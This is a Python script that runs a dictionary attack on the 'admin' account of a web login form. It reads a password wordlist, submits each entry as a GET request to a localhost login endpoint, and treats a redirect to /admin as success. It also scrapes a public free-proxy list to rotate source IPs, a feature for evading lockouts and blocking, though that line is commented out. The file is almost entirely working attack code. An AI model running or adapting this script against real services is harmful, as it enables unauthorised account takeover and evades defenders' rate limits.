import sys
from datetime import datetime
import requests
from lxml.html import fromstring
from itertools import cycle
 
if len(sys.argv) != 2:
    sys.exit("Usage: ./%s <list_of_passwords>" % sys.argv[0])
 
def get_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    parser = fromstring(response.text)
    proxies = set()
    for i in parser.xpath('//tbody/tr')[:50]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            # Grabbing IP and corresponding PORT
            proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                              i.xpath('.//td[2]/text()')[0]])
            proxies.add(proxy)
    return proxies
 
 
def fillfound():
    pass_dic = open(sys.argv[1], 'r', encoding="ISO-8859-1")
    pass_nb = 0
    retry = 0
    max_retry = 50

    proxies = get_proxies()
    proxy_pool = cycle(proxies)
    proxy = {
        "http": "http://" + next(proxy_pool)
    }
 
    for line in pass_dic:
        pass_str = line.strip()
        retry = 0
        url = 'http://localhost/login/validated'
        while True:
            try:
                payload = {'username': 'admin', 'password': pass_str}
                resp = requests.get(url, params=payload) # add ", proxies=proxy" for proxies
                if resp.history:
                    for respHistory in resp.history:
                        if respHistory.headers['Location'].endswith('/admin'):
                            pass_nb += 1
                            return pass_nb, pass_str
                        else:
                            print("[x] \"%s\" is not the password" % pass_str)
                break
            except (KeyboardInterrupt, SystemExit):
                print("\n[x] Program Interrupted...")
                return pass_nb
            except Exception as e:
                print ("[x] Connection error, reconnecting... %s of %s" %
                       (retry+1, max_retry))
                proxy = { "http": "http://" + next(proxy_pool) }
                retry += 1
                print (e)
                if retry == max_retry:
                    print("[x] Too many retries, program interrupted...")
                    return pass_nb
                continue
    
    pass_dic.close()
 
    return pass_nb, pass_str
 
 
def main():
    t = datetime.now()
    pass_nb = fillfound()
    print("\n[*] Scanning completed, %s account(s) found with \"%s\" as password, elapsed time: %s." %
          (pass_nb[0], pass_nb[1], datetime.now() - t))
 
 
if __name__ == "__main__":
    main()
    sys.exit()